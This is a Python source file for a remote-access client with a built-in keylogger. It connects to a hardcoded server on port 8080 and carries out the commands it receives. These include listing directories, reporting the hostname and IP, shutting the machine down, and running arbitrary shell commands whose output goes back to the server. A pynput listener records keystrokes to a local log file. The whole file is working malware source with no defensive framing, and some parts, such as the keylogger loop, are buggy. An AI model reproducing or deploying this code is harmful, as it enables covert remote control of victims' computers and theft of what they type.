import os
import subprocess
import socket
from pynput.keyboard import Key, Listener
import logging
import threading
import time


s = socket.socket()
port = 8080

# host = str(input('enter server address'))
host = "LAPTOP-OQ5DPIGF"
s.connect((host, port))
print("\n Connected to the server successfully \n")


class myThread (threading.Thread):
    def __init__(self, threadID, name):
        threading.Thread.__init__(self)
        self.threadID = threadID
        self.name = name

    def run(self):
        keyLog()


def keyLog():
    while(log == True):
        if(log != True):
            break
            return
        op = keyLogMiddleware()
        if(op == "ESCAPE"):
            return
    return


def keyLogMiddleware():
    log_directory = ""
    logging.basicConfig(filename=(log_directory + "log_results.txt"),
                        level=logging.DEBUG, format='   %(message)s')
    if(log != True):
        return

    def keypress(Key):
        if(log != True):
            return
        logging.info(str(Key))
    with Listener(on_press=keypress) as listener:
        if(log != True):
            return "ESCAPE"
        listener.join()


global run
run = True
while (run):
    command = s.recv(2048)
    command = command.decode()
    if command == "view_cwd":
        files = os.getcwd()
        files = str(files)
        # s.send("".encode())
        s.send(files.encode())
        print("Command has been executed")
    elif(command == 'DISCONNECT'):
        print("DISCONNECTED")
        s.close()
        run = False
    elif(command == "DIR"):
        print("DIR")
        files = os.listdir()
        fileList = ""
        for file in files:
            fileList += file
            fileList += ","
        fileList = fileList[:-1]
        s.send(fileList.encode())
    elif(command == "list_custom_dir"):
        path = s.recv(5000).decode()
        try:
            items = os.listdir(path)
            itemsStr = ""
            for item in items:
                itemsStr += item
                itemsStr += ','
            itemsStr = itemsStr[:-1]
        except:
            itemsStr = "DIRECTORY NOT FOUND"
        s.send(itemsStr.encode())
    elif(command == "get_ip"):
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        s.send(ip.encode())
    elif(command == "get_name"):
        hostname = socket.gethostname()
        s.send(hostname.encode())
    elif(command == "shutdown"):
        s.send("DONE".encode())
        s.close()
        run = False
        os.system("shutdown \s")
    elif(command == "run_cmd"):
        cmd = s.recv(5000).decode()
        result = subprocess.check_output(cmd, shell=True)
        result = str(result)
        s.send(result.encode())
